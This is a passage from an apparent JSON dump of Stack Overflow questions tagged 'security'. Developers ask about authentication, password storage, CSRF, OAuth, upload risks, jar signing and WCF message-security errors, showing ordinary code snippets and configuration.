$this-&gt;Form-&gt;end(__('Submit'));\n?&gt;\n</code></pre>\n\n<p><strong>Scenario 2:</strong></p>\n\n<p>In the /Views/OfferRequests/add.ctp we have:</p>\n\n<pre><code>&lt;?php \necho $this-&gt;Form-&gt;create('OfferRequest');\necho $this-&gt;Form-&gt;input('product_id');\necho $this-&gt;Form-&gt;input('quantity');\necho $this-&gt;Form-&gt;end(__('Submit'));\n?&gt;\n</code></pre>\n\n<p>And in the OfferRequestsController add() we have:</p>\n\n<pre><code>&lt;?php\n$this-&gt;request-&gt;data['OfferRequest']['user_id'] = $this-&gt;Session-&gt;read('Auth.User.id');\n?&gt;\n</code></pre>\n\n<p>My question is which scenario is more safe, for example against making false requests as other user. For scenario 1, does the Security Component allow manipulating input values through Firebug or some other software?</p>\n\n<p>Thank you for your time!</p>\n"},{"tags":["security","excel","vba","excel-vba","password-protection"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":12812,"score":5,"question_id":259897,"title":"How password protection of Excel VBA code works?","body":"<p>This question is related to <a href=\"http://stackoverflow.com/questions/259663/vba-password-protection-how-it-works-is-it-secure-are-there-any-alternatives\">my previous one</a>.</p>\n\n<p>Can you explain or provide a link to an explanation of how Excel VBA code password protection actually works in versions prior to 2007? What is the difference in Excel 2007 and previous versions in terms of password protection?</p>\n\n<p>Also does Excel's password protection actually encrypt the code? How does Excel execute the code if it is encrypted?</p>\n\n<p>Lastly, how does password removal software for excel work?</p>\n"},{"tags":["php","security","encryption","mcrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12057680,"title":"Image encryption for storage in PHP","body":"<p>I've got a situation and am uncertain how to approach it most effectively. A clients existing system which is built to alter, stamp, sign, etc. PDFs -which also converts the PDFs pages to images (pngs) for display/review, is needing to be 'secured' to handle medical/legal documents and docs which might contain personal information.</p>\n\n<p>We're not going to be writing anything to disk directly if we can avoid it, keeping as much as possible in the DB. I'm familiar with using mcrypt for hashing passwords, etc -would this be a reasonable approach to storing the page images and the resultant PDFs until retrieval? Am I looking at serious processing overhead? Is there a better approach?</p>\n"},{"tags":["java","security","java-ee","jaas","role"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":11699258,"title":"How to change the JAAS context from an interceptor?","body":"<p>I want to ask if it is possible to change the Java EE JAAS Context (assigned user roles) from an EJB interceptor?</p>\n\n<p>I have a few EJB Session beans which are using the method 'isUserInRole()' to test for authorization. On the other hand my application is managing user profiles with some special information which can not be mapped to the JAAS roles/groups managed through the application Java EE realm, because they are created during runtime.</p>\n\n<p>My idea is to implement something like an EJB interceptor, check the informations stored in the users profile form my application, and add some new custom roles to the users credentials/subject. </p>\n\n<p>So the result would be a new dynamic role definition assigned to the credentials which can be asked by my session beans. But these roles will not be hard coded in the ejb (@RolesAllowd) or in the ejb-jar.xml or sun-ejb-jar.xml descriptors.  </p>\n\n<p>Thanks for any help in this question.</p>\n"},{"tags":["android","security","webview","monodroid"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":221,"score":5,"question_id":12033689,"title":"Monodroid WebView Authentication for SSRS webpage","body":"<p>I have made two attempts in trying to access a website with authentication, and I am not sure what is wrong with my attempts. I will list each one. Has anyone tried this and gotten it to work?</p>\n\n<p>This should not be difficult for Java Android programmers to understand, nor should it matter that I am using monodroid <em>EDIT</em> (It DOES matter, because I have a Java implementation below that works just fine)<em>END EDIT</em>. </p>\n\n<p>I am trying to gain access to an SSRS RDL through the WebView and I need to plug in some generic credentials.</p>\n\n<p><strong>ACTIVITY:</strong></p>\n\n<pre><code>    public static string username = \"...\";\n    public static string password = \"...\";\n    public static string website  = \"http://10.0.0.5/Reports\";\n\n    private WebView webView;\n\n    private void setupWebView(int attempt)\n    {\n        webView.Settings.JavaScriptEnabled = true;\n        webView.Settings.BlockNetworkLoads = false;\n\n        switch (attempt)\n        {\n            case 1:\n                {\n                    webView.SetHttpAuthUsernamePassword(website, \"\", username, password);                                              \n                }break;\n            case 2:\n                {\n                    webView.SetWebViewClient(new AuthenticationClient(this));                        \n                }break;\n        }\n        webView.LoadUrl(website);\n    }\n\n    protected override void OnCreate(Bundle bundle)\n    {\n        base.OnCreate(bundle);\n\n        webView = new WebView(this);\n\n        setupWebView(1);//1 or 2 depending on what I am testing\n\n        // Set our view from the \"main\" layout resource\n        SetContentView(webView);           \n    }\n}\n</code></pre>\n\n<p><strong>AuthenticationClient:</strong></p>\n\n<pre><code>    //DECLARED IN ANOTHER FILE\n    [Android.Runtime.Register(\"android/webkit/WebViewClient\", DoNotGenerateAcw = true)]\n    public class AuthenticationClient:WebViewClient\n    {\n        private Context _context;\n\n        public AuthenticationClient(Context context)\n        {\n            _context = context;\n        }\n\n        public override void OnReceivedError(WebView view, ClientError errorCode, string description, string failingUrl)\n        {\n            Toast.MakeText(_context, \"OnReceivedError: \" + errorCode, ToastLength.Long);\n            //base.OnReceivedError(view, errorCode, description, failingUrl);\n        }\n\n        public override void OnPageStarted(WebView view, string url, Android.Graphics.Bitmap favicon)\n        {\n            Toast.MakeText(_context, \"OnPageStarted: \" + url, ToastLength.Long);\n            //base.OnPageStarted(view, url, favicon);\n        }\n\n        public override bool ShouldOverrideUrlLoading(WebView view, string url)\n        {\n            Toast.MakeText(_context, \"ShouldOverrideUrlLoading: \" + url, ToastLength.Long);\n            view.LoadUrl(url);\n            return true;\n        }\n\n        public override void OnReceivedHttpAuthRequest(WebView view, HttpAuthHandler handler, string host, string realm)\n        {\n            Toast.MakeText(_context, \"OnReceivedHttpAuthRequest: \" + host, ToastLength.Long);\n            handler.Proceed(Activity1.username, Activity1.password);\n        }\n    }\n    //END DECLARATION\n</code></pre>\n\n<p>ATTEMPT 1: It does not even try to load the page. I keep getting an error: <br/>\n<strong>chromium(18710): external/chromium/net/http/http_auth_gssapi_posix.cc:463: [0821/095922:WARNING:http_auth_gssapi_posix.cc(463)] Unable to find a compatible GSSAPI library</strong></p>\n\n<p>ATTEMPT 2: Does not show a single toast message.</p>\n\n<p>I have already looked at:<br/>\n<a href=\"http://developer.android.com/reference/android/webkit/WebView.html\" rel=\"nofollow\">http://developer.android.com/reference/android/webkit/WebView.html</a><br/>\n<a href=\"http://stackoverflow.com/questions/2585055/using-webview-sethttpauthusernamepassword\">Using WebView setHttpAuthUsernamePassword?</a><br/>\n<a href=\"http://stackoverflow.com/questions/3134793/webview-sethttpauthusernamepassword-not-working\">WebView.setHttpAuthUsernamePassword() not working?</a><br/>\n<a href=\"http://stackoverflow.com/questions/8731679/passing-username-and-password-to-ssrs-2005-reports-from-web-application\">Passing username and password to SSRS 2005 reports from web application</a></p>\n\n<p><strong>OTHER STUFF</strong> <br/>\nI have now done it in Java and it works fine. I still need a Mono for Android solution:</p>\n\n<pre><code>public class Android_reporttestActivity extends Activity {\npublic static String username = \"...\";\npublic static String password = \"...\";\npublic static String website = \"http://10.0.0.5/Reports\";       \n\nprivate WebView setupWebView()\n{\n    WebView webView = new WebView(this); \n\n    webView.setWebViewClient(\n        new WebViewClient(){\n            public void onReceivedHttpAuthRequest(WebView view, HttpAuthHandler handler, String host, String realm)\n            {                           \n                handler.proceed(username,password);\n            }\n        }\n    );\n\n    return webView;\n}\n\n@Override\npublic void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    WebView webview = setupWebView();\n\n    // Set our view from the \"main\" layout resource\n    setContentView(webview);\n\n    webview.loadUrl(website);\n}\n</code></pre>\n"},{"tags":["php","xml","security","magento","file-io"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":11833802,"title":"XML file save, potential security issues?","body":"<p>I'm creating a Magento module that saves user-input data to an xml file (held on the server for later use - think business card orders). I'm wondering how secure my process is, and what (if any) security issues might come up. I'll note that I'm hosting this site with a company that specializes in pci-compliant servers and is, additionally, running under <code>CHROOT</code>.</p>\n\n<p>I have some legacy flash files that do the entry (there's a number of them, or I'd just recreate them). These are printing orders, so they need to accept all manner of special characters (and thus, doesn't do too much in the way of validation). </p>\n\n<p>From there: \n$.ajax -> processor.php -> </p>\n\n<pre><code>    /* grab params */\n    if (isset($_POST)) {\n        foreach ($_POST as $key =&gt; $value) {\n            $params[$key] = filter_var($value, FILTER_SANITIZE_STRING);\n        }\n    }\n\n    /* build xml */\n    $xml = new DOMDocument('1.0', 'UTF-8');\n    $xml_root = $xml-&gt;createElement('Root');\n    foreach ($params as $key =&gt; $value) {\n        $xml_node = $xml-&gt;createElement( $key );\n        if(!empty($value) &amp;&amp; $value != 'undefined'){\n            $xml_node-&gt;appendChild( $xml-&gt;createTextNode( $value ));\n        }\n        $xml_root-&gt;appendChild($xml_node);\n    }\n    $xml-&gt;appendChild($xml_root);\n\n    /* create filename */\n    $d = new DateTime('now');\n    $date = str_replace(\" \", \".\",$d-&gt;format('Y-m-d G:i:s'));\n    $keyvar = preg_replace('/[^a-zA-Z0-9-]/', '', $params['keyVar']);\n    $filename = str_replace(\" \", \"\", $params['template'].\".\".$date.\".\".$keyvar.\".xml\" );\n    $file = $_SERVER['DOCUMENT_ROOT'].'/media/customer/orders/'.$filename;\n\n    /* write it */\n    $xml-&gt;save($file);\n</code></pre>\n\n<p>Then I just pass a reference of the file (but not the location) back to the client to be attached to the order. </p>\n\n<p>So: no includes; vars are sanitized (still allowing for special characters); unique file name; file saved to unknown location (via the front-end). </p>\n\n<p>The system is going to be scrutinized by IT security, I just want to catch anything prior to that review. </p>\n\n<p>Am I missing anything?</p>\n"},{"tags":["flash","security","media","publish"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2027,"score":1,"question_id":4925130,"title":"how to securely publish live stream to Adobe Flash Media Server","body":"<p>I want to make sure that only authenticated users are publishing streams to my Adobe Flash Media Server.</p>\n\n<p>Ideally I would like to limit the IPs which are allowed to publish streams to the server.</p>\n\n<p>I read about the Adobe Authentication Plugin, but apparently it is broken since it works only for Adobe Flash Media Live Enconder. It doesn't secure the server for other encoders that publish streams.</p>\n\n<p>Thanks.</p>\n"},{"tags":["ruby-on-rails","security","devise","omniauth","helper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":602,"score":0,"question_id":12032554,"title":"WARNING: Can't verify CSRF token authenticity : Devise with OmniAuth","body":"<p>Suddenly I started getting this error while submitting a form. The only change I made is calling a method defined in ApplicationController which is marked as helper. </p>\n\n<p><strong>app/controllers/application_controller.rb</strong></p>\n\n<pre><code>class ApplicationController &lt; ActionController::Base\n  protect_from_forgery\n\n  helper_method :is_org_admin?\n\n  #Check if current user is Admin in current organization or not\n  def is_org_admin?\n    session[:current_organization].is_admin?(current_user)\n  end\nend\n</code></pre>\n\n<p>is_admin? is defined as</p>\n\n<pre><code>class Organization &lt; ActiveRecord::Base\n  has_many :memberships\n  has_many :users, through: :memberships\n\n  def is_admin?(user)\n    member = memberships.where(user_id: user.id).first\n    if member.nil?\n      false\n    else\n      member.is_admin?\n    end\n  end\nend\n</code></pre>\n\n<p>And is_org_admin? method is being called from view template</p>\n\n<p><strong>app/views/users/index.html.haml</strong></p>\n\n<pre><code> %h1 Users\n    - if is_org_admin?\n      %p= link_to 'Invite new user', new_invitation_path\n</code></pre>\n\n<p>If I remove <code>protect_from_forgery</code> in ApplicationController or call to helper method <code>if is_org_admin?</code> in index.html.haml it works. But as I enable <code>protect_from_forgery</code> or the condition which calls helper defined in ApplicationController, it gives the warning and shows <strong>You need to sign in or sign up before continuing</strong> message on the page.</p>\n\n<p>Would anyone please suggest what is the problem here?</p>\n"},{"tags":["java","security","jar","jnlp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12050421,"title":"What I need to sign jar file?","body":"<p>My colleague gave me a Java project for supporting and enhancement. I need to sign <code>.jar</code> file. I found only next files: <code>genkey.bat</code>, <code>project.cer</code>, <code>signjar.bat</code> and <code>keystore-jar.jar</code> inside project, \nno more information. But from tutorials I undertand that I need alias, passwords etc... May be it is real to sign jar with this existing files (not to create new keystore etc)? </p>\n"},{"tags":["security","oauth"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":167,"score":1,"question_id":9383154,"title":"Plain English explanation for usage of OAuth in conjunction to an internal user management","body":"<p>I'm new to OAuth, and although I have scanned through many documents, I don't seem to have yet a good architecture / design to a secure web application, answering most/all of OWASP Top Ten</p>\n\n<p>My newbie questions are </p>\n\n<ul>\n<li>Why can't I just rely purely on OAuth? why do a user needs credential in my own application?</li>\n<li>If I do, do I need hash / salt anything if I save it? I don't store any passwords, but what about tokens?</li>\n<li>I still need to persist the users so they won't login everytime, (like in OS) - do I \n<ul>\n<li>Somehow use the OAuth token (save it? does it make even sense)?</li>\n<li>Or use the plain old httpOnly secure cookie (if so, what happens if they log out of the Oauth provider? shouldn't I in this case ignore my cookie and let them log out?</li>\n</ul></li>\n<li>How do I implement logging out? I can't force them to log out of the OAuth provider, and if I only delete the httpOnly cookie / invalidate their session locally, is that enough? and security issues?</li>\n<li>How do I implement single sign on? I don't want the user, after approving to click again \"log in using Facebook / Twitter / Google\" I want an effect similiar to SO (page refreshes and \"welcomes you back\" what are the best practices to do that? Why does SO refreshes the page (I assume it has to do with the fact it needs to be client side, but I don't fully understand how it works to even know what to ask)</li>\n</ul>\n\n<p>I guess I have a lot to learn, but reading on so many potential security issues, and having to master so many different topics seems like a good potential for me missing something that someone later will exploit. </p>\n\n<p>Is using a framework such as Spring Security, or using Lift's built in user management going to save me all this headache? or do I have to know exactly what I am doing to avoid things like Session Fixation, Cross Site Request Forgery, Cross site scripting, Rainbow tables and other things I only remotely get...</p>\n"},{"tags":["python","security"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":148,"score":3,"question_id":12042724,"title":"Securely storing passwords for use in python script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7014953/i-need-to-securely-store-a-username-and-password-in-python-what-are-my-options\">I need to securely store a username and password in Python, what are my options?</a>  </p>\n</blockquote>\n\n\n\n<p>I am looking for a way to securely store passwords which I intend to use in some Python scripting. I will be logging into different things and I don't want to store the passwords as plaintext in the script itself.</p>\n\n<p>Instead I was wondering if there is anything which is able to securely store those passwords and then retrieve them using something like a master password which I could enter to the script at the beginning.</p>\n"},{"tags":["php","security","web-security","image-uploading"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":71,"score":2,"question_id":12046160,"title":"security risks if someone uploads a php file instead of an image","body":"<p>Suppose that our web-hosting is linux and php is installed:\n1- What could be the worst that happens when a php code can be uploaded instead of an image.</p>\n\n<p>2- Can the intruder somehow retrieve my database password ? suppose that the directory on which images get stored has 777 file permissions. </p>\n\n<p>3- What if when the image directory has 644 permission?</p>\n\n<p>The answer to my question can be combined with the ones given to these two: <a href=\"http://stackoverflow.com/questions/5606465/security-how-to-validate-image-file-uploads\">Security: How to validate image file uploads?</a> and <a href=\"http://stackoverflow.com/questions/1485419/security-issues-in-accepting-image-uploads\">Security issues in accepting image uploads</a></p>\n"},{"tags":["javascript","performance","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":60,"score":-1,"question_id":12045106,"title":"What are the downsides of using hidden form fields to store values?","body":"<p>What are the downsides of using hidden form fields to store values that would otherwise have to either be a global variable or be passed around from function to function.  For instance...  A variable like currentIndex that changes from song to song in a music player is hard to control with anything other than a global variable .  Well at least it is in my hacked up code.  My question is... Will storing this value in a hidden form field make my script run a lot slower, and or will doing this be introducing security issues?  Thanks for any help and my apologies if this is a duplicate.</p>\n"},{"tags":["javascript","security","rest","authentication","client-side-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":378,"score":0,"question_id":1666650,"title":"JavaScript REST authentication","body":"<p>Are there any solutions to implement REST authentications for clients using only JavaScript?  JavaScript code is always readable by anyone. I read many posts about REST authentication here, but didn't find any answers.</p>\n"},{"tags":["asp.net","security","support","connections"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":12043113,"title":"Server does not support secure connections asp.net","body":"<p>I will repeat already asked question in the hope to get solution.\nIn my computer the following function works fine.</p>\n\n<pre><code>void sendEmail(string mailto, string subject, string body)\n        {\n            try\n            {\n                mydataTableAdapter mta = new mydataTableAdapter();\n                string email = mta.GetData().Rows[0][\"email\"].ToString();\n                string password = mta.GetData().Rows[0][\"password\"].ToString();\n                MailMessage objMail = new MailMessage(email, mailto, subject, body);\n                NetworkCredential objNC = new NetworkCredential(email, password);\n                SmtpClient objsmtp = new SmtpClient(\"smtp.mail.ru\",25);\n                objsmtp.EnableSsl = true;\n                objsmtp.Credentials = objNC;\n                objsmtp.Send(objMail);\n            }\n            catch (Exception ex) { Response.Write(ex.Message); }\n        }\n</code></pre>\n\n<p>But when I run this project in web server, the following error occured: <strong>Server does not support secure connections</strong> and sending email fails.</p>\n\n<p>I tried make:</p>\n\n<pre><code>EnableSsl = false\n\nobjsmtp.UseDefaultCredentials = true;\n</code></pre>\n\n<p>but, none of these solves the problem</p>\n\n<p>Does someone know how to solve this problem?</p>\n"},{"tags":["security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12042982,"title":"Basic secure user password storage workflow","body":"<p>Given a raw password</p>\n\n<ol>\n<li>create an unique salt </li>\n<li>append it to the raw password</li>\n<li>brcypt / SHA512 this combination using disposable secret key that changes over time</li>\n<li>stores the encrypted password and salt in the user table</li>\n</ol>\n\n<p>To verify identity</p>\n\n<ol>\n<li>append the salt to the raw password</li>\n<li>bcrypt / SHA512 the combination verify</li>\n<li>checks the hashed against the db hashed value</li>\n</ol>\n\n<p>In the verify part, what if the current secret key is no longer the same? \nShould I always keep a list of old key and iterate them through to verify that that old password is generated with one of the old keys? If verifier returns true, I will update the new encrypted password.</p>\n\n<p>Also, how can I be sure the salt is unique per-password-per-user?</p>\n\n<p>Is this all I need to do? </p>\n\n<p>Any thing missing? Thanks.</p>\n"},{"tags":["python","regex","security","flask","jinja"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12043021,"title":"With flask/jinja, what is a viable way to safely render a link inside a user generated block of text?","body":"<p>Think twitter where you paste a link next to some plain text and when your tweet is rendered, that url is now a clickable link.</p>\n\n<p>Do I:</p>\n\n<ul>\n<li><p>replace jinja's autoescape with my own by scanning the text for html tags and replacing them with the html entity code</p></li>\n<li><p>use a regular expression to detect a url contained in the text and replace it within an a href=</p>\n\n<ul>\n<li>what would this expression look like to detect any # of .tld's, http/https, www/any subdomain?</li>\n</ul></li>\n<li><p>and render this all as safe in the template?</p></li>\n</ul>\n\n<p>Or is there a python/flask/jinja 'feature' that can better handle this kind of thing?</p>\n"},{"tags":["ios","osx","security","sockets","distributed-objects"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12040731,"title":"Is it secure to communicate with localhost via a socket without TLS or similar?","body":"<p>I'm writing a library that implements a distributed object system over a socket connection. I'm requiring that users sign any messages sent, at least when communicating over a network, as otherwise an attacker could pose as one of the participants and remotely call methods on the other, which would be a Bad Thing.</p>\n\n<p>The main use of this library is for network communications. However I want to make it as simple as possible to get a 'hello world' example running locally without compromising someone's machine. Is it reasonable to assume that incoming data from a connection to localhost is really from localhost without securing it in some other way? Are there any other reasons that this might not be secure?</p>\n\n<p>In case it's relevant, I'm working on OSX/iOS.</p>\n"},{"tags":["java","security","postgresql","web-applications","playframework-2.0"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":138,"score":3,"question_id":12040786,"title":"postgresql: how to store a user password?","body":"<p>I'm using play-framework 2.0 (java web-framework) with postgresql.  </p>\n\n<ol>\n<li>what encryption type for a user's password is the most common today?  I understood that MD5 has been abounded in the last few years.  </li>\n<li>what is the right data-type for field \"password\" in User class (and therefore, in the postgresql DB)?  </li>\n</ol>\n\n<p>thanks</p>\n"},{"tags":["security","webpage"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12040914,"title":"Is it any safer to use POST instead of GET?","body":"<p>Is there any inherent \"safety\" with using POST instead of GET?  Example, if I have a page that is open to sql injection, does POST somehow keep me safer?  I know it won't make my code better, or fix my sql injection problem or any of that (just an example), but in general, can POST help a webpage be safer, regardless of what it does?</p>\n"},{"tags":["security","spring","grails","groovy","acegi"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":454,"score":3,"question_id":6201492,"title":"Grails, upgrading from Acegi to Spring security plugin","body":"<p>Yesterday I started upgrading our Grails app from Acegi plugin 0.5.2 to the Spring security plugin. I'm running into a few issues, maybe anyone can help here?</p>\n\n<p>After making the necessary changes (as documented by Burt Beckwith on <a href=\"http://grails-plugins.github.com/grails-spring-security-core/docs/manual/guide/single.html#3%20Migrating%20from%20the%20Acegi%20Plugin\" rel=\"nofollow\">Migrating from the Acegi Plugin</a> ) I was able to start the Grails app once again (woohoo!). However, logging in didn't work anymore. </p>\n\n<p>Our situation is as follows: we use our Grails application pure for its application logic. Authentication is done using a username and password through webservices. As backends we use the database of the app (dao) and a LDAP backend. For now, we've disabled LDAP, to make testing easier.</p>\n\n<p>This is the code which does the authentication:</p>\n\n<pre><code>def authenticate(String username, String password) {\ntry {\n      println \"Trying authentication with user \" + username + \" and password \" + password + \".\"\n      def tempToken = new UsernamePasswordAuthenticationToken(username, password)\n      println \"Temptoken is \" + tempToken\n      def token = authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(username, password))\n      println \"Authentication token received was: \" + token\n    } catch (AuthenticationException authenticationException) {\n        return false\n    }\n    return true     \n}\n</code></pre>\n\n<p>This prints to the log:</p>\n\n<pre><code>Trying authentication with user admin and password admin.\nTemptoken is org.springframework.security.providers.UsernamePasswordAuthenticationToken@1f: Principal: admin; Password: [PROTECTED]; Authenticated: false; Details: null; Not granted any authorities\n</code></pre>\n\n<p>And then it all stops. </p>\n\n<p>The domain classes we use are rather straightforward. We do not use a class such as the User Role for the joins between people and their authorities. Instead we use a many-to-many mapping, as this has always worked for us and is easy to maintain.</p>\n\n<p>Our authority domain class:</p>\n\n<pre><code>class Authority {\nstatic hasMany = [people: Person]\n\n/** description */\nString description\n/** ROLE String */\nString authority = ''\n\nString authorityType\n\nstatic constraints = {\n    authority(help:'x',class:'wide',blank: false,unique:true)\n    description(help:'x',class:'extrawide')\n    authorityType(help:'x',class:'wide')\n    people(help:'x',selectSort:'username',display:false)\n}   \n\nString toString() {\n      return authority;\n}   \n}\n</code></pre>\n\n<p>And our Person domain class:</p>\n\n<pre><code>class Person  {\n\nstatic hasMany = [authorities: Authority]\nstatic belongsTo = Authority\n\n//Authority primaryGroup\n\n/** Username */\nString username\n/** User Real Name*/\nString userRealName\nString familyName\nString givenName\n\n/** MD5 Password */\nString passwd\n/** enabled */\nboolean enabled\n\nString email\nboolean emailShow\n\n/** description */\nString description = ''\n\n\n\nstatic constraints = {\n    username(blank: false, unique: true,help:'x',class:'wide')\n    userRealName(blank: false,help:'x',class:'wide')\n    familyName(blank: false,help:'x',class:'wide')\n    givenName(blank: false,help:'x',class:'wide')\n    email(help:'x',class:'wide')\n    emailShow(help:'x')\n    enabled(help:'x')\n    passwd(blank: false,password:true,show:false,help:'x',class:'wide')\n    authorities(nullable:true,help:'x',sortable:true,selectSort:'authority')        \n}\n\nString toString() {\n      return username;\n  }\n}\n</code></pre>\n\n<p>In Config.Groovy, we have defined:</p>\n\n<pre><code>security {\nactive = false\ncacheUsers = false\n\ngrails.plugins.springsecurity.providerNames = ['daoAuthenticationProvider', 'anonymousAuthenticationProvider', 'rememberMeAuthenticationProvider']\n\ngrails.plugins.springsecurity.userLookUp.userDomainClassName = \"Person\"\ngrails.plugins.springsecurity.authority.className = \"Authority\"\n</code></pre>\n\n<p>As far as the documentation goes, this should work by all means (and so it did for the \"old\" Acegi setup). </p>\n\n<p>To gather some more insights I briefly activated LDAP and found the same issue. WireShark told me that no LDAP calls were made during the login process. My guess would be that either there's something wrong with the code in the Authenticate function or SpringSecurity doesn't know how to pick up our domain classes. </p>\n\n<p>I'd be glad to read any insights!</p>\n"},{"tags":["php","html","security","codeigniter","xss"],"answer_count":4,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":6783,"score":6,"question_id":5337143,"title":"CodeIgniter - why use xss_clean","body":"<p>if I'm sanitizing my DB inserts, and also escaping the HTML I write with <code>htmlentities($text, ENT_COMPAT, 'UTF-8')</code> - is there any point to also filtering the inputs with xss_clean? What other benefits does it give?</p>\n"},{"tags":["security","pdf","drm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12035956,"title":"How to make a document private(like pdf)?","body":"<p>I am working on a website in which we have to share documents like ebooks and pdfs. But I don't want these files to be downloaded or saved by the users but rather can only watch on the site itself(cannot be saved or downloaded). Is there any solution to this problem in any of the web development languages? Further if its not possible, Is there any other way to prevent private viewing of the documents on Hard Disk?</p>\n"},{"tags":["c#",".net","security","x509certificate"],"answer_count":3,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":3357,"score":1,"question_id":1228439,"title":"X509 guide/tutorial in C#","body":"<p>Can anyone point me to a good introductory materials on X509 certificates with examples in C#.</p>\n"},{"tags":["ios","xcode","security","documentation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12034245,"title":"Is SecTrustGetTrustResult function in Security.framework on iOS?","body":"<p>Reading the documentation (<a href=\"http://developer.apple.com/library/mac/documentation/security/Reference/SecurityFrameworkReference/SecurityFrameworkReference.pdf\" rel=\"nofollow\">Security Framework</a>) I got the impression that the \nSecTrustGetTrustResult function is in Security Framework of iOS and is located in \"SecTrust.h\". According to <a href=\"http://developer.apple.com/library/ios/#documentation/Security/Reference/certifkeytrustservices/Reference/reference.html#//apple_ref/doc/uid/TP30000157\" rel=\"nofollow\">Certificate, Key, and Trust Services References</a> I can use this function to get the details of the kSecTrustResultRecoverableTrustFailure. However, when I added Security Framework in XCode and compile my code, which is like the one here:</p>\n\n<pre><code>OSStatus status = SecTrustGetTrustResult(trust, &amp;result);\n</code></pre>\n\n<p>I always get this error</p>\n\n<pre><code>Apple Mach-O linker (id) error\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\n</code></pre>\n\n<p>Detail error is as below:</p>\n\n<pre><code>Undefined symbols for architecture i386:\n  \"_SecTrustGetTrustResult\", referenced from:\n      -[ViewController connection:willSendRequestForAuthenticationChallenge:] in ViewController.o\nsymbol(s) not found for architecture i386\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\n</code></pre>\n\n<p>I have already imported the \"Security/Security.h\" file in my viewcontroller.h file but the error didn't go away. </p>\n\n<p>And I looked at the source code of SecTrust.h but couldn't find the function declaration of \"SecTrustGetTrustResult\". So can anyone tell me whether this \"SecTrustGetTrustResult\" still exists or not?</p>\n"},{"tags":["wcf","security","nonce"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12034222,"title":"WCF - The nonce is invalid or replayed","body":"<p>I'm using WCF and have a client accessing a service using wshttpbinding.</p>\n\n<p>Now I get some errors I dont quite understand. These errors doesn't seem random but seems to occur when calling one particular service\nwhich uses quite some time to compute the result. Same service seems ok on other input which results in shorter compute/response time. Something that makes me belive that some kind of \ntimeout or similar are causing this.</p>\n\n<p>Below is the binding for my client</p>\n\n<pre><code> &lt;wsHttpBinding&gt;\n        &lt;binding name=\"SecureBinding\"  closeTimeout=\"01:00:00\" openTimeout=\"01:00:00\"\n                 receiveTimeout=\"01:00:00\" sendTimeout=\"01:00:00\" bypassProxyOnLocal=\"false\"\n                 transactionFlow=\"false\" hostNameComparisonMode=\"StrongWildcard\" maxBufferPoolSize=\"524288\"\n                 maxReceivedMessageSize=\"2147483647\" messageEncoding=\"Text\" textEncoding=\"utf-8\" useDefaultWebProxy=\"true\"\n                 allowCookies=\"false\"&gt;\n\n                &lt;readerQuotas maxDepth=\"64\" maxStringContentLength=\"2147483647\"\n            maxArrayLength=\"50000\" maxBytesPerRead=\"409600\" maxNameTableCharCount=\"2147483647\" /&gt;   \n\n                &lt;reliableSession ordered=\"true\" inactivityTimeout=\"00:10:00\" enabled=\"false\" /&gt;\n                &lt;security mode=\"Message\"&gt;            \n                    &lt;message clientCredentialType=\"Certificate\" negotiateServiceCredential=\"false\" algorithmSuite=\"Default\" establishSecurityContext=\"false\"/&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n&lt;/wsHttpBinding&gt;\n</code></pre>\n\n<p>This normally works out ok as stated above but sometimes error occurs. To get some more information I configured wcf tracing and saw some warnings and error at the service.\nWhen the service is called I first I get an:</p>\n\n<p><em>WARNING .... The security protocol cannot verify the incoming message</em></p>\n\n<p>Then in the activity below (service trace viewer) I get the following error with callstack listed</p>\n\n<p><em>System.ServiceModel.Security.MessageSecurityException\n    - The nonce is invalid or replayed.</em></p>\n\n<pre><code>System.ServiceModel.Security.ReceiveSecurityHeader.CheckNonce(NonceCache cache, Byte[] nonce)\nSystem.ServiceModel.Security.ReceiveSecurityHeader.ProcessPrimarySignature(SignedXml signedXml, Boolean isFromDecryptedSource)\nSystem.ServiceModel.Security.ReceiveSecurityHeader.ProcessEncryptedData(EncryptedData encryptedData, TimeSpan timeout, Int32 position, Boolean 